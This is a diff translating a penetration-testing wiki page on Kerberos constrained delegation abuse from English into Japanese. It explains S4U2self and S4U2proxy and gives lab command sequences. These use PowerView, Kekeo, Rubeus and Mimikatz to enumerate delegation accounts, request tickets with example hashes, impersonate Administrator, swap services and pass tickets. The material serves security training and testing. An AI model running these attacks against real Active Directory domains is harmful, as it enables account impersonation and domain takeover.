@@ -1,22 +1,21 @@
-# Constrained Delegation
+# 制約付き委任
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Constrained Delegation
+## 制約付き委任
 
-Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against a **service** of a machine.
+これを使用すると、ドメイン管理者はコンピュータが**ユーザーまたはコンピュータを**サービスに対して**なりすます**ことを**許可**できます。
 
-- **Service for User to self (**_**S4U2self**_**):** If a **service account** has a _userAccountControl_ value containing [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user.
-- **Service for User to Proxy(**_**S4U2proxy**_**):** A **service account** could obtain a TGS on behalf any user to the service set in **msDS-AllowedToDelegateTo.** To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.
+- **ユーザー自身のサービス (**_**S4U2self**_**):** もし**サービスアカウント**が _userAccountControl_ 値に [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) を含んでいる場合、そのアカウントは他の任意のユーザーの代わりに自分自身（サービス）のためにTGSを取得できます。
+- **プロキシのためのユーザーサービス(**_**S4U2proxy**_**):** **サービスアカウント**は、**msDS-AllowedToDelegateTo** に設定されたサービスのために任意のユーザーの代わりにTGSを取得できます。そのためには、まずそのユーザーから自分自身へのTGSが必要ですが、S4U2selfを使用してそのTGSを取得した後に他のTGSを要求できます。
 
-**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_ ’ in AD, you will **not be able to impersonate** them.
+**注意**: ユーザーがADで「_アカウントは機密であり、委任できません_」とマークされている場合、そのユーザーを**なりすます**ことは**できません**。
 
-This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to the **service configured** (possible **privesc**).
+これは、**サービスのハッシュを侵害**すると、**ユーザーをなりすまし**、そのユーザーの代わりに**サービスにアクセス**できることを意味します（可能な**権限昇格**）。
 
-Moreover, you **won't only have access to the service that the user is able to impersonate, but also to any service** because the SPN (the service name requested) is not being checked, only privileges. Therefore, if you have access to **CIFS service** you can also have access to **HOST service** using `/altservice` flag in Rubeus.
+さらに、**ユーザーがなりすますことができるサービスへのアクセスだけでなく、任意のサービスへのアクセスも**得られます。なぜなら、SPN（要求されたサービス名）はチェックされず、特権のみがチェックされるからです。したがって、**CIFSサービス**にアクセスできる場合、Rubeusの`/altservice`フラグを使用して**HOSTサービス**にもアクセスできます。
 
-Also, **LDAP service access on DC**, is what is needed to exploit a **DCSync**.
-
+また、**DC上のLDAPサービスアクセス**は、**DCSync**を悪用するために必要です。
 ```bash:Enumerate
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -44,12 +43,10 @@ tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31
 tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
-
 > [!WARNING]
-> There are **other ways to obtain a TGT ticket** or the **RC4** or **AES256** without being SYSTEM in the computer like the Printer Bug and unconstrain delegation, NTLM relaying and Active Directory Certificate Service abuse
+> 他にも**TGTチケット**や**RC4**または**AES256**を取得する方法があります。例えば、プリンターバグや制約のない委任、NTLMリレー、Active Directory証明書サービスの悪用などです。
 >
-> **Just having that TGT ticket (or hashed) you can perform this attack without compromising the whole computer.**
-
+> **そのTGTチケット（またはハッシュ）を持っているだけで、コンピュータ全体を危険にさらすことなくこの攻撃を実行できます。**
 ```bash:Using Rubeus
 #Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
@@ -77,8 +74,6 @@ tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.mo
 #Load the TGS in memory
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
 ```
-
-[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+[**詳細情報はired.teamをご覧ください。**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
 
 {{#include ../../banners/hacktricks-training.md}}
-
